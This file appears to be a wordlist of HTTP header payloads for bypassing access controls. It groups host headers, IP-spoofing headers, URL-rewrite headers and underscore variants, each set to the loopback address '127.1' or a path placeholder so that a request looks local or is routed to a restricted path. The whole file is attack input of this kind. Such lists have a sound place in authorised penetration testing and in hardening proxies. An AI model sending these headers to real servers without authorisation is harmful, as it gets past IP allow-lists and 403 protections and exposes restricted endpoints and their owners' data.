##[host headers]
host http://127.1
x-host 127.1
http-forwarded http://127.1
x-forwarded http://127.1
x-forwarded-for http://127.1
x-forwarded-host http://127.1
referer http://127.1/
##[ip spoof]
x-proxyuser-ip 127.1
x-remote-addr http://127.1
x-remote-ip 127.1
x-client-ip 127.1
x-custom-ip-authorization 127.1
x-originating-ip 127.1
##[rewrite headers]
x-original-url __path__
x-rewrite-url __path__
##[underscore headers]
http_forwarded http://127.1
http_client_ip 127.1
http_forwarded_for http://127.1
http_x_forwarded http://127.1
http_x_forwarded_for http://127.1
